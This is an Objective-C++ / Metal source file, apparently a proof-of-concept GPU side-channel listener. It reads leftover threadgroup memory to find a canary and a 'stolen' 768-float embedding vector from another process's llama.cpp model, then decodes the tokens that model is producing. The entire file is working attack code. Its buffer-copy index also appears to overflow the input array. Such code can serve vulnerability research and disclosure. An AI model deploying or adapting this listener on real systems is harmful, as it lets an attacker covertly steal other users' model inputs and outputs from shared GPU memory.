#import <Foundation/Foundation.h>
#include <utility>
#import <Metal/Metal.h>

#include <iostream>
#include <mutex>

#define threadsPerGroup 512
// Try to guess how many compute units there are
// (i.e. how many shared memory locations there are)
#define TGPerGrid 32

#include "ggml-metal.h"
#include "llama.h"
static llama_context ** g_ctx;
llama_model * model;
int prev_max = -1;

std::mutex m;

#define EMBEDDING_SIZE 768
#define VOCAB_SIZE 32000

// i is the stolen vector
// dst is the result of the final matrix multiplication
void do_mult(float *dst, float *i) {

	// TODO: Maybe change params
	struct ggml_init_params params = {
		.mem_size   = 144944 + 33312 + 289888,
		.mem_buffer = NULL,
	};

	struct ggml_context * ctx0 = ggml_init(params);
	struct ggml_tensor * y = ggml_new_tensor_1d(ctx0, GGML_TYPE_F32, EMBEDDING_SIZE);
	memcpy(y->data, i, EMBEDDING_SIZE*sizeof(float));

	// Sets the input parameter to be y
	ggml_set_param(ctx0, y);
	struct ggml_tensor * cur;

	// Sets the operation to be a matrix multiplication
	ggml_cgraph gf = {};
	cur = ggml_mul_mat(ctx0, get_output(model), y);
	ggml_set_name(cur, "result_output");
	ggml_build_forward_expand(&gf, cur);
	gf.n_threads = 1;
	ggml_graph_compute(ctx0, &gf); // TODO: does this need to be the metal version?
	memcpy(dst, (float *) ggml_get_data(cur), sizeof(float)*VOCAB_SIZE);

	float max = 0.0f;
	int arg_max = 0;
	for (int i = 0; i < VOCAB_SIZE; i++) {
		if (dst[i] > max) {
			max = dst[i];
			arg_max = i;
		}
	}
	if (arg_max != prev_max && arg_max < VOCAB_SIZE) {
		printf("argmax: %d (%s)\n", arg_max, llama_token_to_str(*g_ctx, arg_max));
		fflush(stdout);
		prev_max = arg_max;
	}

	ggml_free(ctx0);
}


int main(int argc, const char *argv[]) {

	// Load in the model
	llama_init_backend(false);

	llama_context * ctx;
	g_ctx = &ctx;

	auto lparams = llama_context_default_params();
	model = llama_load_model_from_file("models/ggml-shakespeare-768x12-f16-output-q6_k.bin", lparams);

	ctx = llama_new_context_with_model(model, lparams);

	if (model == NULL) {
		fprintf(stderr, "%s: error: unable to load model\n", __func__);
		return 1;
	}

	float* dst = (float *) malloc(sizeof(float)*VOCAB_SIZE);
	float* input = (float *) malloc(sizeof(float)*EMBEDDING_SIZE);

	for (int i = 0; i < VOCAB_SIZE; i++) {
		dst[i] = -1;
	}
	for (int i = 0; i < EMBEDDING_SIZE; i++) {
		input[i] = 0.0f;
	}

	@autoreleasepool {
		// Get default Metal device
		id<MTLDevice> device = MTLCreateSystemDefaultDevice();
		if (!device) {
			NSLog(@"Metal is not supported on this device.");
			return -1;
		}

		// Make sure we get all the local memory
		const int gpuSharedMemorySizeBytes = device.maxThreadgroupMemoryLength;

		// For each threadgroup, we need space for all its shared memory
		const int outputMemSize = gpuSharedMemorySizeBytes * TGPerGrid;

		const int numFloats = outputMemSize / sizeof(float);

		// Load shader source
		NSString *shaderPath = @"./examples/metalCovertListener/metalCovertListener.metal";
		NSError *loadError = nil;
		NSString *shaderSource =
			[NSString stringWithContentsOfFile:shaderPath
									encoding:NSUTF8StringEncoding
										error:&loadError];
		if (!shaderSource) {
			NSLog(@"Failed to load shader source: %@", loadError);
			return -1;
		}

		// Compile Metal shader source
		NSError *compileError = nil;
		id<MTLLibrary> library = [device newLibraryWithSource:shaderSource
													options:nil
														error:&compileError];
		if (!library) {
			NSLog(@"Failed to compile Metal shader: %@", compileError);
			return -1;
		}

		// Load kernel function
		id<MTLFunction> function =
			[library newFunctionWithName:@"covertListenerKernel"];
		if (!function) {
			NSLog(@"Failed to find the function 'covertListenerKernel'");
			return -1;
		}


		// Create compute pipeline
		id<MTLComputePipelineState> pipeline =
			[device newComputePipelineStateWithFunction:function
												error:&compileError];
		if (!pipeline) {
			NSLog(@"Failed to create pipeline state: %@", compileError);
			return -1;
		}

		// Create Metal buffers
		id<MTLBuffer> bufferResult =
			[device newBufferWithLength:outputMemSize
								options:MTLResourceStorageModeShared];

		int iters = 0;

		while(iters < 100) {

			// Create command queue and encoder
			id<MTLCommandQueue> commandQueue = [device newCommandQueue];
			id<MTLCommandBuffer> commandBuffer = [commandQueue commandBuffer];
			id<MTLComputeCommandEncoder> encoder =
				[commandBuffer computeCommandEncoder];

			[encoder setComputePipelineState:pipeline];
			[encoder setBuffer:bufferResult offset:0 atIndex:0];
			[encoder setBytes:&numFloats length:sizeof(numFloats) atIndex:1];

			// Set thread execution config
			MTLSize gridSize = MTLSizeMake(TGPerGrid, 1, 1);
			MTLSize threadgroupSize = MTLSizeMake(threadsPerGroup, 1, 1);

			[encoder setThreadgroupMemoryLength:gpuSharedMemorySizeBytes atIndex:0];

			[encoder dispatchThreads:gridSize threadsPerThreadgroup:threadgroupSize];
			[encoder endEncoding];

			[commandBuffer commit];
			[commandBuffer waitUntilCompleted];

			float* result = (float*)bufferResult.contents;

			int canary = 100;

			for(int i = 0; i < numFloats - canary; i++) {
				bool flag = false;

				for(int k = 0; k < canary; k++) {
					if(result[i + k] != k) {
						flag = true;
						break;
					}
				}

				if(flag) {
					continue;
				}

				printf("\nFound the signal %6d with payload:", i);
				for(int k = i + canary; k < i + canary + EMBEDDING_SIZE; k++) {
						printf(" %.4f", result[k]);

					input[k - i + canary] = result[k];
				}
				std::cout << std::endl;

				m.lock();
				do_mult(dst, input);
				m.unlock();

				iters++;
				break;
			}
		}
	}
	return 0;
}
